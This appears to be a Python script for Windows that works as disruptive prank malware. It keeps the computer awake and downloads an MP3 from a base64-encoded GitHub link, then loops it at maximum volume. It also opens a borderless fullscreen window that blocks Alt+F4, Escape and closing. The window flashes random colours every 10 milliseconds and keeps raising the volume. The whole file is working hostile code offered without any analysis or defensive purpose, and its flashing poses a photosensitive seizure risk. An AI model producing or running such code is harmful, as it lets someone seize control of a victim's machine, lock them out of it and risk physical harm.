import ctypes
import ctypes.wintypes
import random
import time
import threading
import os
import tempfile
import requests
import sys

# ----------------------------------------------------------------------
# 1. Prevent sleep / screen saver (ES_CONTINUOUS | ES_DISPLAY_REQUIRED | ES_SYSTEM_REQUIRED)
# ----------------------------------------------------------------------
ES_CONTINUOUS = 0x80000000
ES_DISPLAY_REQUIRED = 0x00000002
ES_SYSTEM_REQUIRED = 0x00000001
flags = ES_CONTINUOUS | ES_DISPLAY_REQUIRED | ES_SYSTEM_REQUIRED

kernel32 = ctypes.windll.kernel32
kernel32.SetThreadExecutionState(flags)

# ----------------------------------------------------------------------
# 2. Prepare download URL and temp file path
# ----------------------------------------------------------------------
# Base64 encoded URL (same as original)
b64_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2VsbGlzMDkwL0VsbGlzLVBvcmplY3QzMjEyNTEyL2QxMDI3YjEwMTFlYTViMGNhZWRkMGZiNDI2MWUzNDAzZWEzZTQ0MzUvc29uZy5tcDM="
download_url = "https://raw.githubusercontent.com/ellis090/Ellis-Project3212512/d1027b1011ea5b0caedd0fb4261e3403ea3e4435/song.mp3"  # decoded from base64
temp_file = os.path.join(tempfile.gettempdir(), "s.mp3")

# ----------------------------------------------------------------------
# 3. Download the MP3 file in a background thread
# ----------------------------------------------------------------------
def download_file(url, dest):
    try:
        r = requests.get(url, stream=True)
        r.raise_for_status()
        with open(dest, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
        print("Download completed.")
    except Exception as e:
        print(f"Download failed: {e}")

threading.Thread(target=download_file, args=(download_url, temp_file), daemon=True).start()

# ----------------------------------------------------------------------
# 4. Function to send Volume Up key (VK_VOLUME_UP = 0xAF = 175)
# ----------------------------------------------------------------------
def send_volume_up():
    KEYEVENTF_KEYDOWN = 0x0000
    KEYEVENTF_KEYUP = 0x0002
    VK_VOLUME_UP = 0xAF
    user32 = ctypes.windll.user32
    user32.keybd_event(VK_VOLUME_UP, 0, KEYEVENTF_KEYDOWN, 0)
    time.sleep(0.01)
    user32.keybd_event(VK_VOLUME_UP, 0, KEYEVENTF_KEYUP, 0)

# ----------------------------------------------------------------------
# 5. Build the overlay window using tkinter (full-screen, topmost, no close)
# ----------------------------------------------------------------------
import tkinter as tk

class ChaosWindow:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("")
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="black")
        self.root.overrideredirect(True)          # no borders / title bar

        # Disable window closing (Alt+F4, close button)
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.root.bind("<Alt-F4>", lambda e: "break")
        self.root.bind("<Escape>", lambda e: "break")   # optional, but keeps user from escaping

        # Timer for color chaos (adjust interval to ~10ms, similar to original intent)
        self.chaos_interval = 10   # milliseconds
        self.running = True

    def on_closing(self):
        # Cancel the close event (keep window alive)
        return

    def color_chaos(self):
        if not self.running:
            return
        r = random.randint(0, 255)
        g = random.randint(0, 255)
        b = random.randint(0, 255)
        hex_color = f"#{r:02x}{g:02x}{b:02x}"
        self.root.configure(bg=hex_color)
        send_volume_up()
        self.root.after(self.chaos_interval, self.color_chaos)

    def start_chaos(self):
        self.running = True
        self.color_chaos()

    def stop_chaos(self):
        self.running = False

    def run(self):
        self.root.mainloop()

# ----------------------------------------------------------------------
# 6. Wait 10 seconds (for download to complete), then play music and start chaos
# ----------------------------------------------------------------------
time.sleep(10)

# Attempt to play MP3 using Windows Media Player COM object (same as original)
def play_mp3_com(file_path):
    try:
        import win32com.client
        wmp = win32com.client.Dispatch("WMPlayer.OCX")
        wmp.URL = file_path
        wmp.settings.setMode("loop", True)
        wmp.settings.volume = 100
        wmp.controls.play()
        return True
    except Exception as e:
        print(f"COM playback failed: {e}")
        return False

# Fallback 1: pygame.mixer
def play_mp3_pygame(file_path):
    try:
        import pygame
        pygame.mixer.init()
        pygame.mixer.music.load(file_path)
        pygame.mixer.music.play(-1)  # loop forever
        pygame.mixer.music.set_volume(1.0)
        return True
    except Exception as e:
        print(f"Pygame playback failed: {e}")
        return False

# Fallback 2: start with default player (no loop)
def play_mp3_default(file_path):
    try:
        os.startfile(file_path)
    except Exception as e:
        print(f"Default player failed: {e}")

if os.path.exists(temp_file):
    if not play_mp3_com(temp_file):
        if not play_mp3_pygame(temp_file):
            play_mp3_default(temp_file)
else:
    print("MP3 file not found, skipping music playback")

# ----------------------------------------------------------------------
# 7. Create and show the chaos window
# ----------------------------------------------------------------------
window = ChaosWindow()
window.start_chaos()
window.run()
